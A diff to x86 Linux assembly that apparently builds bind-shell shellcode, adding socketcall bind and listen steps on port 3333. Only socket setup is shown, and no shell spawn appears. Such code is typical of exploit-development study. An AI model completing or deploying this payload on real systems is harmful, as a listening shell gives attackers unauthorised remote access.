@@ -41,15 +41,31 @@ _start:
   ; INADDR_ANY and struct padding
   push 0x0
   ; port 3333 in hex bigendian
-  push 0xd05
+  push WORD 0xd05
   ; AF_INET ip domain
-  push 0x2
+  push WORD 0x2
   ; socket file descriptor
   push esi
   ; socketcall args
   mov ecx, esp
   ; socketcall SYS_BIND action
   mov ebx, 0x2
+  ; socketcall syscall
+  mov eax, 0x66
+  ; kernel interruption
+  int 0x80
+
+  ; ----- LISTEN ON SOCKET -----
+  ; C code: listen(sockfd, MAX_CLIENT_CONNECTIONS)
+
+  ; max 5 client connections
+  push 0x5
+  ; socket file descriptor
+  push esi
+  ; socketcall args
+  mov ecx, esp
+  ; socketcall SYS_LISTEN	action
+  mov ebx, 0x4
   ; socketcall syscall
   mov eax, 0x66
   ; kernel interruption
